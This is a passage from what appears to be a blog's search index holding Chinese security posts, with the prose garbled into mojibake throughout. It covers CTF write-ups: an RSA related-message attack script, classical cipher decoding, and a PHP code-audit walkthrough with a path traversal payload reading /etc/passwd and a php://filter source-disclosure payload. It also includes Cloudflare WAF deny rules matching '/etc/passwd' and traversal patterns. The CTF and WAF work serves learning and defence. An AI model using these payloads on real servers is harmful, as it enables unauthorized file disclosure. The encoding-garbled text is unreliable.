ä¸ºç»™å‡ºçš„å·²çŸ¥æ•°å¤ªå¤§ï¼›æ‰€ä»¥éœ€è¦å…¬å¼æ¨å¯¼æ¥ç”Ÿæˆä»£ç ï¼š\\[\\because\\quadc=pow(mm+padding,e,n)\\\\\\therefore\\quad\\left\\{\\begin{aligned}c_1â‰¡(m+padding_1)^e&amp;(modn)\\\\c_2â‰¡(m+padding_2)^e&amp;(modn)\\\\\\end{aligned}\\right.\\\\ä»¤ï¼šm_1=m+padding_1,m_2=m+padding_2;\\\\\\therefore\\quadm_1-m_2=padding_1-padding_2\\\\\\therefore\\quad\\left\\{\\begin{aligned}f(x)=ax+b\\\\m_1=m_2+(padding_1+padding_2)\\\\\\end{aligned}\\right.\\\\\\therefore\\quadf(m_1)=am_2+b\\\\ç”±\\câ‰¡m^e\\mod\\nï¼Œä»£å…¥c_1ã€c_2\\\\\\therefore\\quad\\left\\{\\begin{aligned}c_1â‰¡m_1^e&amp;(mod\\n)\\\\c_2â‰¡m_2^e&amp;(mod\\n)\\\\\\end{aligned}\\right.\\\\åˆ\\because\\m_1=am_2+b\\\\\\therefore\\quad\\left\\{\\begin{aligned}c_1â‰¡(am_2+b)^e&amp;(mod\\n)\\\\c_2â‰¡m_2^e&amp;(mod\\n)\\\\\\end{aligned}\\right.\\\\ä»£å…¥e=3ï¼Œå±•å¼€\\\\\\therefore\\quad(am_2+b)^3=a^3m_2^3+3b(am_2)^2+3am_2b^2+b^3\\\\\\therefore\\quadc_1â‰¡a^3m_2^3+3b(am_2)^2+3am_2b^2+b^3mod\\n\\\\\\therefore\\quadc_1â‰¡a^3m_2^3+3ba^2m_2^2+3b^2am_2+3b^3-2b^3mod\\n\\\\\\therefore\\quadc_1-a^3m_2^3+2b^3â‰¡3b(a^2m_2^2+bam_2+b^2)mod\\n\\\\åˆ\\because\\quad(am_2)^3-b^3â‰¡(am_2-b)(a^2m_2^2+bam_2+b^2)\\\\\\therefore\\quad\\left\\{\\begin{aligned}c_1-a^3m_2^3+2b^3â‰¡3b(a^2m_2^2+bam_2+b^2)mod\\n\\qquad(1)\\\\(am_2)^3-b^3â‰¡(am_2-b)(a^2m_2^2+bam_2+b^2)mod\\n\\qquad(2)\\\\c_2â‰¡m_2^3\\mod\\n\\qquad(3)\\\\\\end{aligned}\\right.\\\\\\therefore\\quad\\left\\{\\begin{aligned}(am_2-b)(c_1-a^3m_2^3+2b^3)â‰¡(am_2-b)[3b(a^2m_2^2+bam_2+b^2)]mod\\n\\\\3b[(am_2)^3-b^3]â‰¡3b(am_2-b)(a^2m_2^2+bam_2+b^2)mod\\n\\\\\\end{aligned}\\right.\\\\\\therefore\\quad(am_2-b)(c_1-a^3m_2^3+2b^3)â‰¡3b[(am_2)^3-b^3]mod\\n\\\\ä»£å…¥ï¼š(c_1-a^3c_2+2b^3)(am_2-b)â‰¡3b(a^3c_2-b^3)mod\\n\\\\\\because\\quadm=m_2-padding_2\\\\\\therefore\\quadmâ‰¡(\\frac{3b(a^3c_2-b^3)}{c_1-a^3c_2+2b^3}+b)\\a-padding2\\mod\\n(æ±‚açš„é€†å…ƒ)\\\\\\]æ—¢ç„¶æ¨å¯¼å‡ºäº†å…¬å¼ï¼Œå†™è„šæœ¬å³å¯importgmpyimportbinasciidefgetM2(a,b,c1,c2,n,e):\ta3=pow(a,e,n)\tb3=pow(b,e,n)\tfirst=c1-a3*c2+2*b3\tprint(\"first:\")\tprint(first)\tfirst=first%n\tsecond=e*b*(a3*c2-b3)\tsecond=second%n\tthird=second*gmpy.invert(first,n)\tthird=third%n\tfourth=(third+b)*gmpy.invert(a,n)\treturnfourth%ne=0x3a=1b=-1#padding1-padding2c1=0x7ba5502ecbc3b15ad8c2db8f30a593eb062dde4d7dfacadf0a28291d1a576389a18dfba0607c0243f843f637449089dd2090d47ee9845d4147f02afd4d891f19c2=0x891ac4f663df41c1f6433ee3513d749c3ba02fe0aacd7f51d791b9bac4f7e5194bd484d78d972c344faf600f7d3aa580485774768efc47ab8ddb67eeeb330fa1padding2=1#padding2n=0xb28ae8f29f8b90e8b8c5667b2b71e49929446b41f7f7a3e9e45bc52a1e8c45d59c1788be48a9c365d51feee0b2cd3295001cdad1ba5ccf808686b5ce5a269ae5m=getM2(a,b,c1,c2,n,e)-padding2#printm#printhex(m)#printbinascii.unhexlify(hex(m))print(binascii.unhexlify(hex(m)[2:].strip(\"L\")))binascii.unhexlifyï¼šè¿”å›ç”±åå…­è¿›åˆ¶å­—ç¬¦ä¸²hexstrè¡¨ç¤ºçš„äºŒè¿›åˆ¶æ•°æ®ã€‚æ­¤å‡½æ•°åŠŸèƒ½ä¸b2a_hex()ç›¸åã€‚hexstrå¿…é¡»åŒ…å«å¶æ•°ä¸ªåå…­è¿›åˆ¶æ•°å­—ï¼ˆå¯ä»¥æ˜¯å¤§å†™æˆ–å°å†™ï¼‰ï¼Œå¦åˆ™ä¼šå¼•å‘Errorå¼‚å¸¸ã€‚ç®—æ³•è§£å¯†#0x05æ …æ ç®—æ³•é¢˜ç›®æè¿°ï¼šè¢«å°é±¼ä¸€è¿å°†äº†ä¸¤å†›ï¼Œä½ å¿ƒé‡Œæ›´åŠ ä¸æœæ°”äº†ã€‚ä¸¤ä¸ªäººä¸€èµ·ç»§ç»­å¾€å‰èµ°ï¼Œä¸€è·¯ä¸Šæ‚è€å–è‰ºçš„å¾ˆå¤šï¼Œä½†æ˜¯ä½ ä¿©æ¯«æ— å…´è¶£ï¼Œç›´ç›´çš„å°±å†²ç€ä¸‹ä¸€ä¸ªè°œé¢˜çš„åœ°æ–¹å»äº†ã€‚åˆ°äº†ä¸€çœ‹ï¼Œè¿™ä¸ªè°œé¢çœ‹èµ·æ¥å°±å·²ç»æœ‰ç‚¹åƒç­”æ¡ˆäº†æ ·å­äº†ï¼Œæ—è¾¹è¿˜ç”»ç€ä¸€å¼ ç”»ï¼Œæ˜¯ä¸€å‰¯å†œå®¶å°é™¢çš„å›¾ç”»ï¼Œä¸Šé¢ç”»ç€ä¸€ä¸ªå†œå¦‡åœ¨æ …æ é‡Œé¢å–‚5åªå°é¸¡ï¼Œä½ å˜¿å˜¿ä¸€ç¬‘å¯¹ç€å°é±¼è¯´è¿™æ¬¡å¯æ˜¯æˆ‘å…ˆæ‰¾åˆ°ç­”æ¡ˆäº†ã€‚é¢˜å¹²ï¼šç»™å‡ºæ–‡ä»¶å­—ç¬¦ä¸²ccehgyaefnpeoobe{lcirg}epriec_ora_gæ …æ é‡Œé¢å–‚5åªå°é¸¡ï¼›æ …æ ç®—æ³•ï¼Œ5#0x06å‡¯æ’’å¯†ç [â€¦]#0x07æ‘©å°”æ–¯ç”µç Â·morseé¢˜å¹²1ï¼šç»™å‡ºä¸€ä¸²æ•°å­—1111101000001010111100000000000111001010010000010010110ï¼Œæ ¹æ®1é«˜ä½/0ä½ä½è½¬æ¢ä¸ºæ‘©ä¸ç æœ€ç»ˆè½¬æ¢å³å¯å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œå°±å¦‚ä¸Šé¢çš„é¢˜å¹²ä¸€æ ·ï¼Œæœ‰æ—¶ç»™å‡ºçš„é¢˜ç›®ä¸ä¸€å®šä¼šé‚£ä¹ˆè€¿ç›´è®©ä½ ä¸€çœ¼çœ‹å‡ºæ¥æˆ–è€…ç”¨å·¥å…·è½¬æ¢å‡ºæ¥ï¼Œéœ€è¦åšä¸€äº›å…¶ä»–çš„è½¬æ¢ï¼šé¢˜å¹²2:--/.-/-.--/..--.-/-..././..--.-/..../.-/...-/./..--.-/.-/-./---/-/...././.-./..--.-/-.././-.-./---/-.././..../..../..../..../.-/.-/.-/.-/.-/-.../.-/.-/-.../-.../-.../.-/.-/-.../-.../.-/.-/.-/.-/.-/.-/.-/.-/-.../.-/.-/-.../.-/-.../.-/.-/.-/.-/.-/.-/.-/-.../-.../.-/-.../.-/.-/.-/-.../-.../.-/.-/.-/-.../-.../.-/.-/-.../.-/.-/.-/.-/-.../.-/-.../.-/.-/-.../.-/.-/.-/-.../-.../.-/-.../.-/.-/.-/-.../.-/.-/.-/-.../.-/.-/-.../.-/-.../-.../.-/.-/-.../-.../-.../.-/-.../.-/.-/.-/-.../.-/-.../.-/-.../-.../.-/.-/.-/-.../-.../.-/-.../.-/.-/.-/-.../.-/.-/-.../.-/.-/-.../.-/.-/.-/.-/-.../-.../.-/-.../-.../.-/.-/-.../-.../.-/.-/-.../.-/.-/-.../.-/.-/.-/-.../.-/.-/-.../.-/.-/-.../.-/.-/-.../.-/-.../.-/.-/-.../-.../.-/-.../.-/.-/.-/.-/-.../-.../.-/-.../.-/.-/-.../-.../.-å¾ˆæ˜æ˜¾é¢˜1æ˜¯ç©ºæ ¼åˆ†å‰²ï¼Œé‚£ä¹ˆé¢˜2å°±æ˜¯/åˆ†å‰²ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥æŠŠæ–œæ æ¢æˆç©ºæ ¼åœ¨è½¬æ¢ï¼Œéƒ½æ˜¯ä¸€æ ·çš„ï¼›é€šè¿‡ç®—æ³•è½¬æ¢åç»™å‡ºï¼šMAY_BE_HAVE_ANOTHER_DECODEHHHHAAAAABAABBBAABBAAAAAAAABAABABAAAAAAABBABAAABBAAABBAABAAAABABAABAAABBABAAABAAABAABABBAABBBABAAABABABBAAABBABAAABAABAABAAAABBABBAABBAABAABAAABAABAABAABABAABBABAAAABBABAABBAå¾ˆæ˜æ˜¾æ˜¯2æ¬¡åŠ å¯†ï¼ŒABæ··åˆçš„å­—ç¬¦ä¸²ï¼›æœ‰CryptoCTFç»éªŒçš„å¤§æ‰‹å­ä»¬ä¸€çœ¼å°±èƒ½çœ‹å‡ºæ¥ï¼ŒåŸ¹æ ¹ç¼–ç ï¼šå°å†™ï¼š&gt;&gt;&gt;s=\"ATTACKANDDEFENCEWORLDISINTERESTING\"&gt;&gt;&gt;print(s.lower())attackanddefenceworldisinterestingå‚è€ƒRSAç®—æ³•åŸç†ï¼ˆä¸€ï¼‰RSAç®—æ³•åŸç†ï¼ˆäºŒï¼‰CTFä¸­RSAé¢˜å‹è§£é¢˜æ€è·¯åŠæŠ€å·§RSAåŠ å¯†ç®—æ³•ä¸»è¦å…¬å¼æµ…æRSAPaddingAttack"
  },

  {
    "title"    : "CTF - ä»£ç å®¡è®¡å‘",
    "category" : "about",
    "tags"     : "",
    "url"      : "/about/CTF-Code-Audit-WalkThrough/",
    "date"     : "Jul 27, 2021",
    "content"  : "é›¶ï¼šWEB#0x01ä»»æ„æ–‡ä»¶è¯»å–ç»•è¿‡å…ˆçœ‹ifåˆ¤æ–­ä¸»é€»è¾‘ï¼ŒåŒæ—¶æ»¡è¶³ä¸‹åˆ—ä¸‰ä¸ªæ¡ä»¶å³å¯ï¼šif(!empty($_REQUEST['file'])ä¼ å…¥fileå‚æ•°ä¸ä¸ºç©ºï¼Œä¸å¤šè¯´ï¼›&amp;&amp;is_string($_REQUEST['file'])ä¼ å…¥fileå‚æ•°æ˜¯å­—ç¬¦ä¸²ï¼›ä¼ å…¥fileå‚æ•°æ»¡è¶³emmmç±»çš„checkFileå‡½æ•°ï¼Œä¸»è¦çœ‹è¿™ä¸ªå‡½æ•°ï¼Œä¼ å…¥checkFileå‡½æ•°çš„fileå‚æ•°è¢«é‡æ–°æ¥å—ä¸ºpageå‚æ•°ï¼Œåˆ¤æ–­å‚æ•°æ˜¯å¦ä¸ºç©ºã€æ˜¯å¦ä¸ºå­—ç¬¦ä¸²ï¼Œæ˜¯åˆ™å¾€ä¸‹ï¼š&amp;&amp;emmm::checkFile($_REQUEST['file']))æ£€æŸ¥$pageåœ¨ä¸åœ¨æ•°ç»„$whitelisté‡Œ$whitelist=[\"source\"=&gt;\"source.php\",\"hint\"=&gt;\"hint.php\"];if(in_array($page,$whitelist)){returntrue;}å¯¹ä¼ å…¥å‚æ•°è¿›è¡Œä¸€æ¬¡urlè§£ç å¾€ä¸‹ï¼›$_page=mb_substr($page,0,mb_strpos($page.'?','?'));å…ˆçœ‹mb_strposï¼Œå°±æ˜¯ï¼Ÿåœ¨$pageé‡Œç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®å†çœ‹mb_substrï¼Œåªç•™äº†$pageä»0åˆ°ï¼Ÿçš„ä½ç½®ï¼›å¯¹_pageé‡å¤1ï¼›å¯¹_pageé‡å¤2ï¼›å¯¹_pageé‡å¤3ï¼›å†æ¬¡åˆ¤æ–­å‚æ•°é‡å¤1ï¼›include$_REQUEST['file'];&lt;?phphighlight_file(__FILE__);classemmm{publicstaticfunctioncheckFile(&amp;$page){$whitelist=[\"source\"=&gt;\"source.php\",\"hint\"=&gt;\"hint.php\"];if(!isset($page)||!is_string($page)){echo\"youcan'tseeit\";returnfalse;}if(in_array($page,$whitelist)){returntrue;}$_page=mb_substr($page,0,mb_strpos($page.'?','?'));if(in_array($_page,$whitelist)){returntrue;}$_page=urldecode($page);$_page=mb_substr($_page,0,mb_strpos($_page.'?','?'));if(in_array($_page,$whitelist)){returntrue;}echo\"youcan'tseeit\";returnfalse;}}if(!empty($_REQUEST['file'])&amp;&amp;is_string($_REQUEST['file'])&amp;&amp;emmm::checkFile($_REQUEST['file'])){include$_REQUEST['file'];exit;}else{echo\"&lt;br&gt;&lt;imgsrc=\\\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\\\"/&gt;\";}åªè¦æˆ‘ä»¬æ„é€ çš„å‚æ•°æ»¡è¶³ä¸Šè¿°æ­¥éª¤ç»•è¿‡ï¼šfile=source.php%3f../../../../../../../../../../../../etc/passwdç„¶åæ ¹æ®é¢˜ç›®æç¤ºè¯»å–flagæ–‡ä»¶ã€‚å‚è€ƒPHP:is_string-ManualPHP:mb_strpos-ManualXCTF-WarmupWriteup#0x02NaNNaNNaNNaN-Batmanï¼šå¥‡å¦™çš„jsNaNNaNNaNNaN-Batmané™„ä»¶æ–‡æœ¬ç¼–è¾‘å™¨æ‰“å¼€å‘ç°&lt;script&gt;_='function$()è¶…æ–‡æœ¬æ ‡ç­¾ï¼Œä¿®æ”¹ä¸ºhtmlåç¼€ï¼ŒåŒæ—¶ä¿®æ”¹eval(_)ä¸ºalert(_)å¤„ç†åå¦‚ä¸‹ï¼šfunction$(){vare=document.getElementById(\"c\").value;if(e.length==16)if(e.match(/^be0f23/)!=null)if(e.match(/233ac/)!=null)if(e.match(/e98aa$/)!=null)if(e.match(/c7be9/)!=null){vart=[\"fl\",\"s_a\",\"i\",\"e}\"];varn=[\"a\",\"_h0l\",\"n\"];varr=[\"g{\",\"e\",\"_0\"];vari=[\"it'\",\"_\",\"n\"];vars=[t,n,r,i];for(varo=0;o&lt;13;++o){document.write(s[o%4][0]);s[o%4].splice(0,1)}}}document.write('&lt;inputid=\"c\"&gt;&lt;buttononclick=$()&gt;Ok&lt;/button&gt;');delete_æ ¹æ®ifåˆ¤æ–­é€»è¾‘å†…çš„å®šä¹‰consoleè¾“å‡ºï¼š#0x03phpä¼ªåè®®æœ¬é¢˜æ€è·¯ï¼šindex.phpå¯¹åº”fileå‚æ•°è¯»å–æ–‡ä»¶ä½†æ˜¯è¿‡æ»¤äº†å…³é”®è¯flagï¼ŒåŒæ—¶ç»™å‡ºå…³é”®æ–‡ä»¶secure.phpsecure.phpå¯¹åº”è¾“å‡ºflagçš„é€»è¾‘ï¼›secure.phpå°è¯•è¯»å–å¯¹åº”phpæ–‡ä»¶ä»£ç ï¼šè¯»å–payloadindex.php?file=php://filter/read=convert.base64-encode/resource=secure.phpsecure.phpâœechoPG1ldGEgY2hhcnNldD0iVVRGLTgiPgo8P3BocAogICAgaW5jbHVkZSAnLi9mbGFnLnBocCc7CiAgICBlcnJvcl9yZXBvcnRpbmcoMCk7CiAgICAkcGFyMSA9ICRfR0VUWydwYXIxJ107CiAgICAkcGFyMiA9ICRfR0VUWydwYXIyJ107CiAgICAkcGFyMyA9ICRfUE9TVFsncGFyMyddOwogICAgJHBhcjQgPSAkX1BPU1RbJ3BhcjQnXTsKICAgIGlmIChpc3NldCgkcGFyMSkmJmlzc2V0KCRwYXIyKSYmaXNzZXQoJHBhcjMpJiZpc3NldCgkcGFyNCkpIHsKICAgICAgICBpZiAoJHBhcjEgPT09ICRwYXIyICYmIG1kNSgkcGFyMSkgIT09IG1kNSgkcGFyMikpIHsKICAgICAgICAgICAgZGllKCfov5jmg7Por7vlj5ZmbGFn77yfJyk7CiAgICAgICAgfQogICAgICAgIGlmIChoYXNoKCJtZDQiLCAkcGFyMykgPT0gaGFzaCgibWQ0IiwgJHBhcjQpKSB7CiAgICAgICAgICAgIGVjaG8gJ+e7meS9oGZsYWfvvIEnIC4gJGZsYWc7CiAgICAgICAgfQogICAgfQo=|base64-d#secure.php:&lt;metacharset=\"UTF-8\"&gt;&lt;?phpinclude'./flag.php';error_reporting(0);$par1=$_GET['par1'];$par2=$_GET['par2'];$par3=$_POST['par3'];$par4=$_POST['par4'];if(isset($par1)&amp;&amp;isset($par2)&amp;&amp;isset($par3)&amp;&amp;isset($par4)){if($par1===$par2&amp;&amp;md5($par1)!==md5($par2)){die('è¿˜æƒ³è¯»å–flagï¼Ÿ');}if(hash(\"md4\",$par3)==hash(\"md4\",$par4)){echo'ç»™ä½ flagï¼'.$flag;}}ä»ä»£ç å¯ä»¥çœ‹åˆ°ç›´æ¥ä¼ å…¥çš„å››ä¸ªå‚æ•°GETï¼špar1&amp;par2ï¼ŒPOSTï¼špar3&amp;par4ï¼›åˆ¤æ–­ï¼šif(isset($par1)&amp;&amp;isset($par2)&amp;&amp;isset($par3)&amp;&amp;isset($par4))è®¾ç½®å››ä¸ªå‚æ•°å³å¯ï¼›if($par1===$par2&amp;&amp;md5($par1)!==md5($par2))ä¸åˆ¤æ–­ï¼Œç›´æ¥ä¸æ»¡è¶³å…¶ä¸­ä¸€ä¸ªæ¡ä»¶å³å¯ï¼›æ¯”å¦‚è®©ä¸¤ä¸ªå‚æ•°ä¸ç›¸ç­‰æˆ–ä¸¤ä¸ªå‚æ•°çš„md5å€¼ä¸ç›¸ç­‰ï¼›ç»§ç»­å¾€ä¸‹ï¼šif(hash(\"md4\",$par3)==hash(\"md4\",$par4))ä¸¤ä¸ªå‚æ•°çš„md4å€¼ç›¸ç­‰ç»™å‡ºflagï¼›ä¸å¤šè¯´ï¼Œç›´æ¥ä¸Špayloadï¼š#0x03å–ç“œè¿™é“é¢˜å¯¹äºå½“ä¸‹çš„æˆ‘æ¥è¯´è¿˜æ˜¯æ¯”è¾ƒéš¾ï¼Œæ˜¯çœ‹äº†é¢˜è§£æ‰åšå¾—å‡ºæ¥ï¼›ç©¶å…¶åŸå› æˆ‘è§‰å¾—æ˜¯ç”±äºä»£ç åŸºç¡€å¤ªè¿‡è–„å¼±çš„ç¼˜æ•…ï¼Œå°±æ‹¿è¿™é“é¢˜æ¥è¯´ï¼Œå°±ç®—æ˜¯æ‰¾åˆ°PHPæ–‡æ¡£:Integeræ•´å‹ï¼Œä¸‹ä¸€æ¬¡é‡åˆ°è¿™æ ·çš„é¢˜ç›®è¿˜æ˜¯æ²¡æœ‰åŠæ³•ã€‚é¢˜ç›®æè¿°ï¼šæœ‰ä¸€ä¸ªäººå‰æ¥ä¹°ç“œã€‚HQï¼šå“¥ä»¬ï¼Œè¿™ç“œå¤šå°‘é’±ä¸€æ–¤å•Šï¼Ÿä½ ï¼šä¸¤å—é’±ä¸€æ–¤ã€‚HQï¼šWhat'supï¼è¿™ç“œçš®å­æ˜¯é‡‘å­åšçš„è¿˜æ˜¯ç“œç²’å­æ˜¯é‡‘å­åšçš„ï¼Ÿä½ ï¼šä½ ç§ç§ç°åœ¨å“ªæœ‰ç“œå•Šï¼Ÿè¿™éƒ½æ˜¯å¤§æ£šçš„ç“œï¼Œåªæœ‰6æ–¤ä¸€ä¸ªå’Œ9æ–¤ä¸€ä¸ªçš„ï¼Œä½ å«Œè´µæˆ‘è¿˜å«Œè´µå‘¢ã€‚ï¼ˆHQå¿ƒé‡Œé»˜é»˜ä¸€ç®—ï¼‰HQï¼šç»™æˆ‘æ¥20æ–¤çš„ç“œã€‚ä½ ï¼šè¡Œï¼HQï¼šè¡Œï¼Ÿè¿™ç“œèƒ½ç§°å‡º20æ–¤å—ï¼Ÿä½ ï¼šæˆ‘å¼€æ°´æœæ‘Šçš„ï¼Œè¿˜ä¸ä¼šç§°é‡ï¼ŸHQï¼šæˆ‘é—®ä½ è¿™ç“œèƒ½ç§°å‡º20æ–¤å—ï¼Ÿä½ ï¼šä½ æ˜¯æ•…æ„æ‰¾èŒ¬ï¼Œæ˜¯ä¸æ˜¯ï¼Ÿä½ è¦ä¸è¦å§ï¼HQï¼šä½ è¿™ç“œè¦æ˜¯åˆšå¥½20æ–¤å—æˆ‘è‚¯å®šè¦å•Šã€‚é‚£å®ƒè¦æ˜¯æ²¡æœ‰æ€ä¹ˆåŠå•Šï¼Ÿä½ ï¼šè¦æ˜¯ä¸æ˜¯20æ–¤ï¼Œæˆ‘è‡ªå·±åƒäº†å®ƒï¼Œæ»¡æ„äº†å§ï¼Ÿï¼ˆä½ å¼€å§‹é€‰ç“œç§°é‡ï¼‰è¡¥å……è¯´æ˜ï¼šå½“ç§°çš„æ•°å­—å˜ä¸ºæµ®ç‚¹æ•°è€Œä¸æ˜¯æ•´æ•°æ—¶ï¼ŒHQä¸ä¼šè®¤å¯æœ€ç»ˆçš„ç§°é‡ç»“æœã€‚é¢˜ç›®æè¿°çœ‹å®Œå°±å¯ä»¥å¾—åˆ°æ–¹ç¨‹ï¼š6x+9y=20ï¼›æˆ‘çš„ç¬¬ä¸€ååº”æ˜¯å°è¯•èƒ½å¦è´Ÿæ•°æ¥è§£é¢˜ï¼›è€Œäº‹å®ä¸Šå¹¶ä¸å¯ä»¥:Då®é™…ä¸Šï¼Œé¢˜ç›®è§£é¢˜æ€è·¯æ˜¯æ²¡æœ‰é—®é¢˜çš„ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ä¸Šé¢æ ‡çº¢çš„è¡¥å……è¯´æ˜ï¼Œå› ä¸ºæˆ‘ä»¬çŸ¥é“ä¸Šé¢çš„æ–¹ç¨‹xå’Œyæ˜¯æ²¡æœ‰æ•´æ•°è§£çš„ï¼Œæ‰€ä»¥åŸºæœ¬æ€è·¯å°±æ˜¯é€šè¿‡Intå‹ä¸Floatå‹çš„æ•°åœ¨PHPä¸­çš„è½¬æ¢æ¥ä½¿çš„æ­£è´Ÿç›¸åŠ å¾—åˆ°ä¸€ä¸ªå›ºå®šçš„æ•°ï¼Œä¸‹é¢æ¥è°ˆè°ˆè¿™é“é¢˜ï¼›æˆ‘ä»¬å…ˆæ¥æ•´ç†ä¸€ä¸‹å…³é”®çš„ç‚¹ï¼šServer:nginx/1.21.3ã€X-Powered-By:PHP/8.0.10ï¼›POSTmethod:b6=1&amp;b9=1ï¼Œb6å‚æ•°ä»£è¡¨6æ–¤çš„ç“œï¼Œb9ä»£è¡¨9æ–¤çš„ç“œï¼›æå‡ºé—®é¢˜ï¼š1ã€PHP8æ˜¯å¦æœ‰è¿™æ ·çš„æœºåˆ¶å¯¼è‡´å¯ä»¥æº¢å‡ºä¸ºè´Ÿæ•´æ•°å‘¢ï¼Ÿç­”ï¼šå¯ä»¥ï¼ŒPHPæ–‡æ¡£:Integeræ•´å‹2ã€å¦‚æœæœ‰çš„è¯ï¼Œå›åˆ°è¿™é“é¢˜ä¸Šæ¥ï¼Œåœ¨æ²¡æœ‰ç»™å‡ºä»£ç çš„æƒ…å†µä¸‹å¦‚ä½•åˆ©ç”¨å‘¢ï¼Ÿé’ˆå¯¹é—®é¢˜1ï¼Œæˆ‘å‚è€ƒæ–‡æ¡£ç»™å‡ºçš„ä»£ç åšäº†ä¸€äº›æœ¬åœ°å®éªŒæ–¹ä¾¿ç†è§£ï¼šå¦‚æœç»™å®šçš„ä¸€ä¸ªæ•°è¶…å‡ºäº†intçš„èŒƒå›´ï¼Œå°†ä¼šè¢«è§£é‡Šä¸ºfloatã€‚åŒæ ·å¦‚æœæ‰§è¡Œçš„è¿ç®—ç»“æœè¶…å‡ºäº†intèŒƒå›´ï¼Œä¹Ÿä¼šè¿”å›floatã€‚å¦‚ä¸‹å›¾ï¼šå½“ä»æµ®ç‚¹æ•°floatè½¬æ¢æˆæ•´æ•°intæ—¶ï¼Œå°†å‘ä¸‹å–æ•´ã€‚"
  },

  {
    "title"    : "ModSec & CloudFlare WAF Initial Research",
    "category" : "about",
    "tags"     : "",
    "url"      : "/about/WAF-developed-by-Grayscale-forwarding/",
    "date"     : "Jul 22, 2021",
    "content"  : "[æŒç»­æ›´æ–°]ModSec&amp;CloudFlareWAFInitialResearché›¶ï¼šCloudFlareWAFæœ€è¿‘åœ¨ç ”ç©¶webé˜²ç«å¢™ï¼Œçœ‹åˆ°CloudFlareæœ‰ç°æˆçš„äº‘WAFä¾›ä½¿ç”¨ï¼Œäºæ˜¯å°±ç ”ç©¶äº†ç ”ç©¶ï¼Œè‡ªå®šä¹‰äº†ä¸€äº›è‡ªå·±éœ€è¦çš„webæ‹¦æˆªè§„åˆ™ã€‚æ‰€éœ€ï¼šåŸŸååŸŸåå¯¹åº”è§£æIPå¼€æ”¾WEBServerCloudFlareå¸å·æ³¨å†Œå³å¯ä¸€èˆ¬æ­¥éª¤ä¸ºï¼šå‡è®¾æ‚¨çš„åŸŸåè´­ä¹°æœåŠ¡å•†ä¸ºé˜¿é‡Œäº‘ï¼›1.ç™»å½•é˜¿é‡Œäº‘åŸŸåé¢æ¿è®¾ç½®è§£æIPï¼›2.é˜¿é‡Œäº‘åŸŸåé¢æ¿DNSServerä¿®æ”¹ä¸ºï¼šdiva.ns.cloudflare.comnitin.ns.cloudflare.com3.è¿›å…¥CloudFlareï¼Œæ·»åŠ ç«™ç‚¹ï¼Œæ·»åŠ CloudFlareæŒ‡å®šè®¤è¯é¡µé¢æ·»åŠ åˆ°Webrootç›®å½•ä¸‹ï¼›4.é…ç½®WAFã€‚#0x01è§£æIPäº‘è§£æDNS-é˜¿é‡Œäº‘#0x02è‡ªå®šä¹‰DNSServeræŠŠDNSè§£ææœåŠ¡å™¨è§£ææˆæ­¥éª¤2å³å¯ï¼›æ­¥éª¤3åŒæ ·æ ¹æ®é¡µé¢å¼•å¯¼æ“ä½œå³å¯ï¼Œæ­¤å¤„ä¸åšæ¼”ç¤ºã€‚#0x03CloudFlareWAFconfigè¿›å…¥CloudFlareä¸»é¡µï¼Œç‚¹å‡»åŸŸå{domain.info}-&gt;é˜²ç«å¢™-&gt;æ·»åŠ ç­›é€‰å™¨firewall:https://dash.cloudflare.com/{random-token-value}/{domain.value}/firewallåœ¨é…ç½®è¿‡æ»¤å™¨æ—¶ï¼Œæˆ‘é’ˆå¯¹ä¸ªäººéœ€æ±‚å’Œå½“å‰æ”»å‡»è¡Œä¸ºè¿›è¡Œäº†ä¸€äº›æ€è€ƒï¼šå¯¹ä¸€ä¸ªé™æ€ç«™ç‚¹æ¥è¯´ï¼Œå¾ˆæ˜æ˜¾æˆ‘ä»¬å¯¹å¤–æä¾›WEBæœåŠ¡åªç”¨åˆ°GETè¯·æ±‚ï¼Œæ²¡æœ‰å…¶ä»–è¯·æ±‚ï¼Œæ‰€ä»¥æˆ‘å°±æŠŠPOSTæ·»åŠ åˆ°äº†é»‘åå•å†…ï¼š(http.request.methodeq\"POST\")å€¼å¾—ä¸€æçš„æ˜¯ï¼šæ‚¨éœ€è¦æ³¨æ„å¦‚æœæ‚¨æ·»åŠ çš„æ˜¯æ ¹åŸŸåa.comDNSæœåŠ¡å™¨ä¸ºCloudFlareï¼Œé‚£ä¹ˆfirewallå°†ä¼šä½œç”¨äºæ‰€æœ‰å¯è¯†åˆ«çš„åŸŸåå¦‚1.a.com&amp;2.a.cometcâ€¦é’ˆå¯¹æ–‡ä»¶è¯»å–payloadçš„é»‘åå•ï¼š(http.request.uri.pathcontains\"etc/passwd\")âœbin4xinsrccurlhttps://about.sentrylab.cn/etc/passwd-IHTTP/2403date:Fri,23Jul202102:05:34GMTcontent-type:text/plain;charset=UTF-8content-length:16x-frame-options:SAMEORIGINcache-control:private,max-age=0,no-store,no-cache,must-revalidate,post-check=0,pre-check=0expires:Thu,01Jan197000:00:01GMTcf-request-id:0b72b571c10000ead3f0a9d000000001expect-ct:max-age=604800,report-uri=\"https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct\"report-to:{\"endpoints\":[{\"url\":\"https:\\/\\/a.nel.cloudflare.com\\/report\\/v3?s=M5QRiSM6AQIHABiTpenP95FWMk%2FHuRnQpjqIQ9WDX0d%2FM9fI6nr0TpYUtThWUa64GPpRP%2Baubtxi4kHZ7UYNvA%2BXuhkeX73zKJLD6JtsWWRb96yS3KbdotjjJMqBX6%2F9DFUFfQU%3D\"}],\"group\":\"cf-nel\",\"max_age\":604800}nel:{\"report_to\":\"cf-nel\",\"max_age\":604800}server:cloudflarecf-ray:6731582f792aead3-LAXalt-svc:h3-27=\":443\";ma=86400,h3-28=\":443\";ma=86400,h3-29=\":443\";ma=86400,h3=\":443\";ma=86400ç›®å½•éå†payloadé»‘åå•ï¼š(http.request.uri.pathcontains\".\")or(http.request.uri.pathcontains\"%2e\")or(http.request.uri.pathcontains\"%252e\")åœ¨æ­¤å¤„æ‚¨éœ€è¦æ³¨æ„è®¿é—®urlä¸­çš„ç‰¹æ®Šå­—ç¬¦å¦‚/ã€&amp;ï¼Œå¦åˆ™ä¼šå¯¼è‡´WAFè¯¯æŠ¥å½“ç„¶è§„åˆ™åº“è¿˜æ”¯æŒä¼ 